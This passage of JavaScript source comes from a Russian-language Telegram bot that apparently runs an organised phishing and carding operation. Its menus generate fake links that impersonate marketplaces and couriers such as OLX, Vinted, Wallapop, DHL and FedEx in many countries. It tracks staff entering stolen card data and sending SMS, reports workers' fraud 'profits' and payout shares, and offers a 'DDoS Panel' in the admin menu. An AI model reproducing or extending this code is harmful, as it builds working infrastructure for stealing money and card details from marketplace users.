                await q.editMessageCaption(`Ошибка...`).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            } else {
                let about_vbiv = ``
                let about_sms = ``
                fs.readdir(`database/vbivers/on_vbiv`, async (err, fls) => {
                    fs.readdir(`database/smsers/`, async (err, fls_sms) => {
                        if (!err) {
                            if (fls.length == 0) {
                                about_vbiv = `💤 <b>На вбиве никого</b>`
                            } else {
                                about_vbiv = `✍️ <b>На вбиве всех стран:</b>\n🇮🇹🇵🇱🇪🇸🇩🇪\n`
                                for (let i = 0; i < fls.length; i++) {
                                    about_vbiv += `👨‍💻 @${fls[i]}\n`
                                }
                            }

                            if (fls_sms.length == 0) {
                                about_sms = `💤 <b>На смс никого</b>`
                            } else {
                                about_sms = `✍️ <b>На отправке смс:</b>\n`
                                for (let i = 0; i < fls_sms.length; i++) {
                                    about_sms += `🥷 @${fls_sms[i]}\n`
                                }
                            }

                            let keyboard = [
                                        [{ text: '🔗 Создать ссылку', callback_data: '📦 Торговые площадки' }],
                                        [{ text: `🧢 Vinted`, callback_data: `🧢 Vinted` }, { text: '📓 Наставники', callback_data: '📓 Наставники' }],
                                        [{ text: '💬 Чаты', callback_data: '💬 Чаты' }, { text: '🖨 Мои товары', callback_data: '🖨 Мои товары' }],
                                        [{ text: '⚙️ Другое', callback_data: '⚙️ Другое' }, { text: '✍️ Сообщить о проблеме', callback_data: '✍️ Сообщить о проблеме' }]
                            ]

                            await teacher.findOne({ tgID: q.from.id }).lean().then(async (res) => {
                                if (res) {
                                   keyboard.push(Array({ text: '🧑‍🏫 Панель наставника', callback_data: '🧑‍🏫 Панель наставника' }))
                                }
                            })

                            if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
                                keyboard.push(Array({ text: '🧑‍💻 Админ панель', callback_data: `🧑‍💻 Админ панель` }))
                            }

                            if (res.status == 'ПРО Воркер') {
                                keyboard.push(Array({ text: '🔥 Панель ПРО воркера', callback_data: `🔥 Панель ПРО воркера` }))
                            }

                            await q.replyWithPhoto('https://ibb.co/LxnHvh8', {
                                caption: `💠 <b>Привет,</b> <code>${q.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🔮 Твой ID:</b> <code>${q.from.id}</code>\n🧿 <b>TAG:</b> <code>#${res.tag}</code>\n🧬 <b>Выплата:</b> <code>${(res.percent != undefined) ? res.percent : 60}</code><b>%</b>\n➖➖➖➖➖➖➖➖➖➖\n${about_vbiv}➖➖➖➖➖➖➖➖➖➖`,
                                parse_mode: 'HTML',
                                reply_markup: {
                                    inline_keyboard: keyboard,
                                    remove_keyboard: true
                                }
                            }).catch(async (e) => {
                                loggy.warn(`problem with telegram => ${e}`)
                            })
                        }
                    })
                })
            }
        })
    }

    /* error about fakes */
    if (data == '✍️ Сообщить о проблеме') {
        q.scene.enter('aboutError')
    }

    /* admin panel */
    if (data == '🧑‍💻 Админ панель') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            await q.editMessageCaption(`Добро пожаловать в панель администратора, ${q.from.first_name}!`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Добавить вбивера 💳', callback_data: 'Добавить вбивера' }, { text: '💳 Удалить вбивера 💳', callback_data: 'Удалить вбивера' }],
                        [{ text: '💌 Рассылка по чатам', callback_data: `Рассылка по чатам` }, { text: '💌 Рассылка по пользователям', callback_data :'Рассылка по пользователям' }],
                        [{ text: '👥 Пользователи', callback_data: 'admin_Users' }, { text: `🧑‍🏫 Наставники`, callback_data: `admin_TeacherList` }],
                        [{ text: '📊 Статистика проекта', callback_data: 'Статистика проекта' }, { text: '⚙️ Сменить домен', callback_data: 'Сменить домен' }],
                        [{ text: '⚙️ Статистика сервера (показатели нагрузки)', callback_data: 'Статистика сервера' }],
                        [{ text: '🗑 Почистить БД от мусора', callback_data: `🗑 Почистить БД от мусора` }],
                        [{ text: '🔪 DDoS Panel', callback_data: '🔪 DDoS Panel' }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        }
    }

    /* teacher panel */
    if (data == '🧑‍🏫 Панель наставника') {
        await teacher.findOne({ tgID: q.from.id }).lean().then(async (res) => {
            await q.editMessageCaption(`🧑‍🏫 <b>Добро пожаловать в панель наставника,</b> <code>${q.from.first_name}</code>\n\n<b>ℹ️ Информация:</b>\n<b>👨‍🎓 Учеников:</b> <code>${res.count}</code>\n💸 <b>Кол-во профитов с вами:</b> <code>${res.profits_count}</code>\n<b>💸 Сумма профитов с вами:</b> <code>${res.profits_rub}</code>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '👨‍🎓 Список учеников', callback_data: `👨‍🎓 Список учеников` }],
                        [{ text: '⚒ Изменить описание', callback_data: `teacherChange ${q.from.id}` }],
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        }).catch(async (err) => {
            loggy.warn(`problem with teacher panel => ${e}`)
        })
    } 
    
    if (data == '👨‍🎓 Список учеников') {
        await q.replyWithHTML(`⚙️ <b>Подождите, идёт обработка запроса в БД...</b>\n<b>❔ Выведен будет не полный список.</b>`)
        await account.find({ teacher: q.from.username }).lean().then(async (res) => {
            if (res.length == 0) {
                q.answerCbQuery('У вас нету учеников')
            } else if (res.length > 20) {
                let str = ``
                for (let i = 0; i < 20; i++) {
                    str += `<b>${i+1}.</b> <a href="tg://user?id=${res[i].tgID}">${res[i].tgID}</a> <b>| #${res[i].tag} | ${res[i].profits_with_teacher} ₽</b>\n`
                }

                await q.replyWithHTML(str)
            } else {
                let str = ``
                for (let i = 0; i < res.length; i++) {
                    str += `<b>${i+1}.</b> ${res[i].tgID} <b>| #${res[i].tag} | ${res[i].profits_with_teacher} ₽</b>\n`
                }

                await q.replyWithHTML(str)
            }
        })
    }

    /* services */
    if (data == '📦 Торговые площадки') {
        await q.editMessageCaption('🏁 <b>Выберите страну по которой хотите работать!</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🇮🇹 Италия', callback_data: '🇮🇹 Италия' }, { text: `🇵🇱 Польша`, callback_data: `🇵🇱 Польша` }],
                    [{ text: '🇪🇸 Испания', callback_data: '🇪🇸 Испания' }, { text: '🇩🇪 Германия', callback_data: '🇩🇪 Германия' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇸🇪 Швеция') {
        await q.editMessageCaption(`🇸🇪 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🧧 Blocket 2.0', callback_data: '🇸🇪 Blocket 2.0' }, { text: '🚙 Postnord 2.0', callback_data: '🇸🇪 Postnord 2.0' }],
                    [{ text: '🚕 UBER 2.0', callback_data: '🇸🇪 UBER 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇵🇹 Португалия') {
        await q.editMessageCaption(`🇵🇹 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📬 OLX 2.0', callback_data: '🇵🇹 OLX 2.0' }, { text: '🚘 CTT 2.0', callback_data: '🇵🇹 CTT 2.0' }],
                    [{ text: '❤️‍🔥 MBWAY', callback_data: '🇵🇹 MBWAY 2.0' }, { text: '🚕 UBER 2.0', callback_data: '🇵🇹 UBER 2.0' }],
                    [{ text: '📦 FedEx', callback_data: '🇵🇹 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇷🇴 Румыния') {
        await q.editMessageCaption(`🇷🇴 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📬 OLX 2.0', callback_data: '🇷🇴 OLX 2.0' }, { text: '🚙 FanCourier 2.0', callback_data: '🇷🇴 FanCourier 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇰🇿 Казахстан') {
        await q.editMessageCaption(`🇰🇿 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🚚 OLX 2.0`, callback_data: `🇰🇿 OLX 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇮🇹 Италия') {
        await q.editMessageCaption(`🇮🇹 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🧧 Subito 1.0', callback_data: `🇮🇹 Subito 1.0` }, { text: '🧧 Subito 2.0', callback_data: `🇮🇹 Subito 2.0` }],
                    [{ text: '🏦 Wallapop 1.0', callback_data: '🇮🇹 Wallapop 1.0' }, { text: '🏦 Wallapop 2.0', callback_data: `🇮🇹 Wallapop 2.0` }],
                    [{ text: '🌅 Kijiji 2.0', callback_data: '🇮🇹 Kijiji 2.0' }, { text: '🚚 Spedire 2.0', callback_data: '🇮🇹 Spedire 2.0' }],
                    [{ text: '📦 FedEx', callback_data: '🇮🇹 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇵🇱 Польша') {
        await q.editMessageCaption(`🇵🇱 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📬 OLX 2.0', callback_data: `🇵🇱 OLX 2.0` }],
                    [{ text: '🗂 InPost 2.0', callback_data: `🇵🇱 InPost 2.0` }],
                    [{ text: `🧬 Vinted`, callback_data: `🇵🇱 Vinted 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Англия') {
        await q.editMessageCaption(`🏴󠁧󠁢󠁥󠁮󠁧󠁿 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🥷🏿 Gumtree 2.0', callback_data: `🏴󠁧󠁢󠁥󠁮󠁧󠁿 Gumtree 2.0` }],
                    [{ text: '🏦 Wallapop 2.0', callback_data: `🏴󠁧󠁢󠁥󠁮󠁧󠁿 Wallapop 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇦🇺 Австралия') {
        await q.editMessageCaption(`🇦🇺 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🥷🏿 Gumtree 2.0', callback_data: `🇦🇺 Gumtree 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇧🇾 Беларусь') {
        await q.editMessageCaption(`🇧🇾 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🚚 Куфар 2.0`, callback_data: `🇧🇾 Куфар 2.0` }, { text: `📦 СДЭК 2.0`, callback_data: `🇧🇾 СДЭК 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇨🇦 Канада') {
        await q.editMessageCaption(`🇨🇦 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🚚 Kijiji 2.0`, callback_data: `🇨🇦 Kijiji 2.0` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇪🇸 Испания') {
        await q.editMessageCaption(`🇪🇸 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🚚 Milanuncios 1.0`, callback_data: `🇪🇸 Milanuncios 1.0` }, { text: `🚚 Milanuncios 2.0`, callback_data: `🇪🇸 Milanuncios 2.0` }],
                    [{ text: `📦 Wallapop 1.0`, callback_data: `🇪🇸 Wallapop 1.0` }, { text: `📦 Wallapop 2.0`, callback_data: `🇪🇸 Wallapop 2.0` }],
                    [{ text: `📮 Correos 2.0`, callback_data: `🇪🇸 Correos 2.0` }],
                    [{ text: '📦 FedEx', callback_data: '🇪🇸 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🚓 BlaBlaCar') {
        await q.editMessageCaption(`🚓 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🇮🇹 BlaBlaCar 1.0', callback_data: '🇮🇹 BlaBlaCar 1.0' }, { text: '🇪🇸 BlaBlaCar 1.0', callback_data: '🇪🇸 BlaBlaCar 1.0' }],
                    [{ text: '🇫🇷 BlaBlaCar 1.0', callback_data: '🇫🇷 BlaBlaCar 1.0' }, { text: '🇩🇪 BlaBlaCar 1.0', callback_data: '🇩🇪 BlaBlaCar 1.0' }],
                    [{ text: '🇷🇴 BlaBlaCar 1.0', callback_data: '🇷🇴 BlaBlaCar 1.0' }, { text: '🇵🇹 BlaBlaCar 1.0', callback_data: '🇵🇹 BlaBlaCar 1.0' }],
                    [{ text: '🇭🇷 BlaBlaCar 1.0', callback_data: '🇭🇷 BlaBlaCar 1.0'}, { text: '🇧🇷 BlaBlaCar 1.0', callback_data: '🇧🇷 BlaBlaCar 1.0' }],
                    [{ text: '🗺 BlaBlaCar 1.0 (ВЕСЬ МИР)', callback_data: '🗺 BlaBlaCar 1.0 (ВЕСЬ МИР)' }],
                    [{ text: '<=======================>', callback_data: 'nothingnothing' }],
                    [{ text: '🇮🇹 BlaBlaCar 2.0', callback_data: '🇮🇹 BlaBlaCar 2.0' }, { text: '🇪🇸 BlaBlaCar 2.0', callback_data: '🇪🇸 BlaBlaCar 2.0' }],
                    [{ text: '🇫🇷 BlaBlaCar 2.0', callback_data: '🇫🇷 BlaBlaCar 2.0' }, { text: '🇩🇪 BlaBlaCar 2.0', callback_data: '🇩🇪 BlaBlaCar 2.0' }],
                    [{ text: '🇷🇴 BlaBlaCar 2.0',callback_data: '🇷🇴 BlaBlaCar 2.0' }, { text: '🇵🇹 BlaBlaCar 2.0', callback_data: '🇵🇹 BlaBlaCar 2.0' }],
                    [{ text: '🇭🇷 BlaBlaCar 2.0', callback_data: '🇭🇷 BlaBlaCar 2.0'}, { text: '🇧🇷 BlaBlaCar 2.0', callback_data: '🇧🇷 BlaBlaCar 2.0' }],
                    [{ text: '🗺 BlaBlaCar 2.0 (ВЕСЬ МИР)', callback_data: '🗺 BlaBlaCar 2.0 (ВЕСЬ МИР)' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🧢 Vinted') {
        await q.editMessageCaption(`🧢 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🇵🇱 Vinted 2.0', callback_data: '🇵🇱 Vinted 2.0' }, { text: '🇪🇸 Vinted', callback_data: '🇪🇸 Vinted 2.0' }],
                    [{ text: '🇮🇹 Vinted', callback_data: '🇮🇹 Vinted 2.0' }, { text: '🇩🇪 Vinted', callback_data: '🇩🇪 Vinted 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 

    if (data == '🛍 Wallapop') {
        await q.editMessageCaption('🌊 <b>Что генерируем?</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🇪🇸 Wallapop 1.0', callback_data: '🇪🇸 Wallapop 1.0' }, { text: '🇪🇸 Wallapop 2.0', callback_data: '🇪🇸 Wallapop 2.0' }],
                    [{ text: '🇮🇹 Wallapop 1.0', callback_data: '🇮🇹 Wallapop 1.0' }, { text: '🇮🇹 Wallapop 2.0', callback_data: '🇮🇹 Wallapop 2.0' }],
                    [{ text: '🇫🇷 Wallapop 1.0', callback_data: '🇫🇷 Wallapop 1.0' }, { text: '🇫🇷 Wallapop 2.0', callback_data: '🇫🇷 Wallapop 2.0' }],
                    [{ text: '🇬🇧 Wallapop 1.0', callback_data: '🇬🇧 Wallapop 1.0' }, { text: '🇬🇧 Wallapop 2.0', callback_data: '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Wallapop 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })
    }
    
    if (data == '🇩🇪 Германия') {
        await q.editMessageCaption(`🇩🇪 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📘 Ebay 2.0', callback_data: '🇩🇪 Ebay 2.0' }, { text: '💼 Quoka 2.0', callback_data: '🇩🇪 Quoka 2.0' }],
                    [{ text: '🚚 DHL 2.0', callback_data: '🇩🇪 DHL 2.0' }, { text: '📦 FedEx', callback_data: '🇩🇪 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇦🇪 ОАЭ') {
        await q.editMessageCaption('🇦🇪 <b>Что генерируем?</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{text: '🚚 EmiratesPost', callback_data: '🇦🇪 EmiratesPost 2.0' }, { text: '📮 Dubizzle', callback_data: '🇦🇪 Dubizzle 2.0' }],
                    [{ text: '📦 FedEx', callback_data: '🇦🇪 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })
    } 
    
    if (data == '🇨🇭 Швейцария') {
        await q.editMessageCaption(`🇨🇭 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🚚 Post', callback_data: '🇨🇭 POST.CH 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇭🇷 Хорватия') {
        await q.editMessageCaption(`🇭🇷 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🚚 Posta', callback_data: '🇭🇷 POSTA.HR 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇸🇰 Словакия') {
        await q.editMessageCaption(`🇸🇰 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💼 Bazar', callback_data: '🇸🇰 BAZAR.SK 2.0' }, { text: '💽 BAZOS.SK', callback_data: '🇸🇰 BAZOS.SK 2.0' }],
                    [{ text: '📻 DPD.SK', callback_data: '🇸🇰 DPD.SK 2.0' }, { text: '🚚 POSTA.SK', callback_data: '🇸🇰 POSTA.SK 2.0' }],
                    [{ text: '📦 FedEx', callback_data: '🇸🇰 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '🇸🇮 Словения') {
        await q.editMessageCaption(`🇸🇮 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💼 BOLHA.SI', callback_data: '🇸🇮 BOLHA.SI 2.0' }, { text: '💽 POSTA.SI', callback_data: '🇸🇮 POSTA.SI 2.0' }],
                    [{ text: '📻 SALOMON.SI', callback_data: '🇸🇮 SALOMON.SI 2.0' }],
                    [{ text: '📦 FedEx', callback_data: '🇸🇮 FedEx 2.0' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    }

    if (data == '🇦🇹 Австрия') {
        await q.editMessageCaption(`🇦🇹 <b>Что генерируем?</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🚚 Post 1.0', callback_data: '🇦🇹 Post 1.0' }, { text: '🚚 Post 2.0', callback_data: '🇦🇹 Post 2.0' }],
                    [{ text: '📮 Laendleanzeiger 1.0', callback_data: '🇦🇹 Laendleanzeiger 1.0' }, { text: '📮 Laendleanzeiger 2.0', callback_data: '🇦🇹 Laendleanzeiger 2.0' }],
                    /* [{ text: '🖍 Bazar 1.0', callback_data: '🇦🇹 Bazar 1.0' }, { text: '🖍 Bazar 2.0', callback_data: '🇦🇹 Bazar 2.0' }], */
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    }

    if (data == '🌍 Booking') {
        q.answerCbQuery('🌍 Booking ещё в разработке...', { show_alert: true }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    }

    /* main buttons */
    if (data == '🖨 Мои товары') {
        await q.editMessageCaption(`🤖 <b>Выбери страну!</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🇮🇹 Италия', callback_data: '🇮🇹 Италия created_tovars' }, { text: '🇪🇸 Испания', callback_data: '🇪🇸 Испания created_tovars' }],
                    [{ text: `🇩🇪 Германия`, callback_data: `🇩🇪 Германия created_tovars` }, { text: `🇵🇱 Польша`, callback_data: `🇵🇱 Польша created_tovars` }],
                    [{ text: '🗑 Удалить всё (со всех сервисов и стран) 🗑', callback_data: `🗑 Удалить всё 🗑` }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
    if (data == '⚙️ Другое') {
        await q.editMessageCaption(`<b>🤖 Панель с настройками профиля и т.д</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '⚙️ Статистика', callback_data: '⚙️ Статистика' }],
                    [{ text: '🔗 Смена BTC Кошелька', callback_data: `🔗 Смена BTC Кошелька` }],
                    [{ text: '⚒ Смена ТЭГа', callback_data: `⚒ Смена ТЭГа` }],
                    [{ text: '💍 Скрыть сервис', callback_data: '💍 Скрыть сервис' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })
    } 
    
    if (data == '⚙️ Статистика') {
        await account.findOne({ tgID: q.from.id }).lean().then(async (acc) => {
            await q.editMessageCaption(`📊 <b>Ваша статистика:</b>\n🐘 <b>Всего профитов</b> <code>${acc.total_profits}</code> <b>на сумму</b> <code>${currency(acc.profit_sum_rub, { separator: ' ', symbol: '', }).format()}</code> <b>₽</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        })
    } 
    
    if (data == '🔗 Смена BTC Кошелька') {
        q.scene.enter('changeBTCAddr')
    } 
    
    if (data == '⚒ Смена ТЭГа') {
        q.scene.enter('changeTag')
    } 
    
    if (data == '💍 Скрыть сервис') {
        await account.findOne({ tgID: q.from.id }).lean().then(async (res) => {
            let hide = {
                hide: '',
                text2: ''
            }

            if (res.hide_service) {
                if (res.hide_service == 'yes') {
                    hide.hide = 'Показывать сервис в канале выплат ✅'
                    hide.text2 = `Не отображается`
                } else {
                    hide.hide = `Скрывать сервис в канале выплат ❌`
                    hide.text2 = `отображается`
                }
            } else {
                hide.hide = `Скрывать сервис в канале выплат ❌`
                hide.text2 = `отображается`
            }
            
            if (res) {
                await q.replyWithHTML(`<b>Статус:</b> <code>${hide.text2}</code>`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: hide.hide, callback_data: hide.hide }]
                        ]
                    }
                })
            } else {
                q.replyWithHTML('Возникла какая-то ошибка...')
            }
        })
    }

    if (data == 'Показывать сервис в канале выплат ✅') {
        await account.findOneAndUpdate({ tgID: q.from.id }, { $set: { hide_service: 'yes' } }).lean().then(async (res) => {
            await q.replyWithHTML('<b>Теперь каждый ваш профит будет отображаться с названием сервиса.</b>')
        })
    }

    if (data == 'Скрывать сервис в канале выплат ❌') {
        await account.findOneAndUpdate({ tgID: q.from.id }, { $set: { hide_service: 'no' } }).lean().then(async (res) => {
            await q.replyWithHTML('<b>Теперь на каждом вашем профите не будет отображёно название сервиса.</b>')
        })
    }

    if (data == '💬 Чаты') {
        await q.editMessageCaption(`🤖 <b>Выберите действие.</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📧 Чат', url: config.teamInfo.chat_link }, { text: '🧾 Выплаты', url: config.teamInfo.profits_channel }],
                    [{ text: '👨‍🎓 Обучение 👨‍🎓', url: 'https://t.me/+hcNk7DiZ6_tmNmZi' }],
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    }
    
    if (data.includes('created_tovars')) {
        let data_split = data.split(' ')

        async function getFakes(service) {
            let fakes

            if (!service.includes('BlaBlaCar')) {
                fakes = await receive.find({ tgID: q.from.id, service: new RegExp(service) }).lean()
            } else {
                fakes = await bbc.find({ tgID: q.from.id }).lean()
            }

            return fakes
        }

        getFakes(data_split[0]).then(async (res) => {
            if (res.length == 0) {
                q.answerCbQuery('🤖 У вас ещё не было созданных объявлений').catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            } else {
                let inline_arr = []
                for (let i = 0; i < res.length; i++) {
                    if (i == 10) {
                        return
                    } else {
                        inline_arr.push(Array({ text: `[${i+1}] ${res[i].service} | ${(res[i].product_price != undefined) ? res[i].product_price : res[i].price} | ${(res[i].product_name != undefined) ? res[i].product_name : res[i].city_from}`, callback_data: `change_ovyab ${data_split[0]} ${data_split[1]} ${res[i].link}` }))
                    }
                }

                inline_arr.push(Array({ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }))
                q.editMessageCaption(`Для детальной информации нажми на товар`, {
                    reply_markup: {
                        inline_keyboard: inline_arr
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            }
        })
    } else if (data.includes('change_ovyab')) {
        let data_split = data.split(' ')
        async function getFake(service, id) {
            let fakes

            if (service.includes('BlaBlaCar')) {
                fakes = await bbc.findOne({ tgID: q.from.id, link: id }).lean()
            } else {
                fakes = await receive.findOne({ tgID: q.from.id, service: new RegExp(service), link: id }).lean()
            }

            return fakes
        }

        getFake(data_split[1], data_split[3]).then(async (res) => {
            generateLink(res.service, res.link, q.from.id).then(async (link) => {
                q.editMessageCaption(`🆔 <b>ID:</b> <code>${res.link}</code>\n\n📦 <b>Название:</b> ${res.product_name}\n💰 <b>Цена:</b> ${res.product_price}\n\n🔗 <b>Получение:</b> ${link}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '⛳️ Перейти ⛳️', url: `${link}` }],
                            [{ text: '🗑 Удалить 🗑', callback_data: `menu_delete_obyav ${res.link}` }],
                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            })
        })
    } 
    
    if (data.includes('menu_delete_obyav')) {
        let data_split = data.split(' ')

        try {
            await receive.deleteMany({ link: data_split[1] })
        } catch (e) {
            await bbc.deleteMany({ link: data_split[1] })
        }

        await q.editMessageCaption(`✅ <b>Объявление с ID</b> <code>${data_split[1]}</code> <b>было успешно удалено.</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    } 
    
